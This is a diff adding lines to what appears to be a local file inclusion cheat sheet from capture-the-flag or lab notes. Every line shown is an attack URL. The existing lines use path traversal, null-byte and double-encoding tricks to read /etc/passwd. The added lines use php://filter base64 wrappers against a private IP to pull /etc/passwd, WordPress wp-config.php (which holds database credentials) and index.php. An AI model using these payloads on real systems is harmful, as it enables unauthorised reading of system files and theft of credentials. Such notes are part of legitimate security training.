@@ -58,6 +58,9 @@ http://example.thm.labs/page.php?file=../../../../../../etc/passwd
 http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
 http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
 http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
+http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../etc/passwd
+http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/wp-config.php
+http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php
 ```
 
 #### PHP Wrappers
